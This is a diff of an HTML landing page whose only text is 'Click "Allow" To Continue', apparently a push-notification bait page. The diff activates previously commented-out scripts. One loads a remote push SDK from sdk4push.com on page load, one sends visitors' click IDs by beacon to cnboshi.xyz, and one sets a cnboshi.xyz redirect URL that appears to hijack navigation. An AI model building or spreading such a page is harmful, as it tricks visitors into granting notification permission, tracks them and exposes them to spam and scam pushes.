@@ -283,9 +283,9 @@
         /*]]>*/
     </style>
     <title>Click "Allow" To Continue</title>
-    <!-- <script>
+    <script>
         function sendEvent(event) {
-            var url = 'https://ally.allysio.com/conv?clid=' + getURLParameter('clickid') + '&event=' + event;
+            var url = 'https://cnboshi.xyz/conv?clid=' + getURLParameter('clickid') + '&event=' + event;
             navigator.sendBeacon(url);
             console.log('Event - ' + event);
         }
@@ -295,40 +295,31 @@
                 (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
             );
         }
-    </script> -->
+    </script> 
 </head>
 
 <body>
-    <!-- <script async data-cfasync="false">
-        (function () {
-            const url = new URL(window.location.href);
-            const clickID = url.searchParams.get("clickid");
-            const sourceID = url.searchParams.get("source");
+<script async data-cfasync="false">
+  (function() {
+      const url = new URL(window.location.href);
+      const clickID = url.searchParams.get("click_id");
+      const sourceID = url.searchParams.get("source_id");
 
-            const s = document.createElement("script");
-            s.dataset.cfasync = "false";
-            s.src = "https://sdk4push.com/f/sdk.js?z=1229113";
-            s.onload = (opts) => {
-                opts.zoneID = 1229113;
-                opts.extClickID = clickID;
-                opts.subID1 = sourceID;
-                opts.actions.onPermissionGranted = () => {
-                    sendEvent('dingyue');
-                    window.location.replace("https://ally.allysio.com/click");
-                };
-                opts.actions.onPermissionDenied = () => {
-                    window.location.replace("https://ally.allysio.com/click");
-                };
-                opts.actions.onAlreadySubscribed = () => {
-                    window.location.replace("https://ally.allysio.com/click");
-                };
-                opts.actions.onError = () => {
-                    window.location.replace("https://ally.allysio.com/click");
-                };
-            };
-            document.head.appendChild(s);
-        })()
-    </script> -->
+      const s = document.createElement("script");
+      s.dataset.cfasync = "false";
+      s.src = "https://sdk4push.com/f/sdk.js?z=1256272";
+      s.onload = (opts) => {
+          opts.zoneID = 1256272;
+          opts.extClickID = clickID;
+          opts.subID1 = sourceID;
+          opts.actions.onPermissionGranted = () => {};
+          opts.actions.onPermissionDenied = () => {};
+          opts.actions.onAlreadySubscribed = () => {};
+          opts.actions.onError = () => {};
+      };
+      document.head.appendChild(s);
+  })()
+</script>
     <div class="container">
         <div class="preloader-wrapper big active">
             <div class="spinner-layer spinner-blue-only">
@@ -345,8 +336,8 @@
         </div>
         <div class="title">Click "Allow" To Continue</div>
     </div>
-    <!-- <script>
-        var bbURL = "https://ally.allysio.com/click";
+  <script>
+        var bbURL = "https://cnboshi.xyz/click";
         ! function () {
             var a;
             try {
@@ -358,7 +349,7 @@
                 }
             } catch (b) { }
         }();
-    </script> -->
+    </script> 
 </body>
 
 </html>
